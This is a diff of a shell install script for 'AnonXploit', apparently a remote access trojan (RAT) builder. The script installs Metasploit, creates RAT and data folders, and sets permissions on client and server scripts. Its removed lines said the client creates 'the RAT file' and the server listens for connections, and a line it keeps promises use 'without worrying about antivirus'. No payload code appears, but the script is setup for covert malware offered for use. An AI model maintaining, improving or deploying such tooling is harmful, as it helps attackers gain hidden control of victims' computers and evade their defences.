@@ -2,20 +2,16 @@
 clear
 sudo apt update
 sudo apt full-upgrade -y
-sudo apt -y install python3 python3-full python3-pip powershell snapd
+sudo apt -y install python3 python3-full python3-pip snapd
 sudo systemctl start snapd ; sudo systemctl start snapd.apparmor
 sudo systemctl enable snapd ; sudo systemctl enable snapd.apparmor
 sudo snap install metasploit-framework
-pwsh -command Install-Module -Name PS2EXE
 python3 -m pip install colorama
 mkdir ./RAT/
 mkdir ./DAT/
-chmod 777 *
+chmod 777 ./client.py
+chmod 777 ./server.py
 clear
 echo -e "\e[36mAnonXploit\e[0m \e[1;92minstalled\e[0m\e[97m!\e[0m"
-echo
-echo -e "\e[97mUse\e[0m \e[3;33mpython3 client\e[0m \e[97mto create the RAT file.\e[0m"
-echo -e "\e[97mUse\e[0m \e[3;33mpython3 server\e[0m \e[97mto listen for connection.\e[0m"
-echo
 echo -e "\033[31mEnjoy the tool\033[0m \033[1;31mwithout\033[0m \033[31mworrying about \033[1;31mantivirus\033[0m.\033[0m"
 echo
